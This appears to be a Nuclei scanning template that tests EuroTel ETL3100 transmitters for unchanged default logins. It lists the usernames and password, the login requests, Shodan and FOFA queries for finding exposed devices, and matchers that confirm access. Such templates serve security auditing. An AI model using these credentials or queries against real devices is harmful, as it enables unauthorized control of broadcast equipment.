id: etl3100-default-login

info:
  name: EuroTel ETL3100 默认口令登录（弱口令）
  author: r3Y3r53
  severity: high
  description: |
    该模板通过尝试 EuroTel ETL3100 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5782.php
    - https://www.exploit-db.com/exploits/51684
  classification:
    cpe: cpe:2.3:h:eurotel:etl3100:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: eurotel
    product: etl3100
    shodan-query: html:"ETL3100"
    fofa-query: body="ETL3100"
  tags: misconfig,default-login,eurotel,vuln

http:
  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        txtUserId={{username}}&txtPassword={{password}}&btnLogin=Login
      - |
        GET /exciter.php HTTP/1.1
        Host: {{Hostname}}

    attack: pitchfork
    payloads:
      username:
        - user
        - operator
      password:
        - etl3100rt1234
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains_all(body_2, "FM Exciter", "Summary", "/logout.php")'
        condition: and
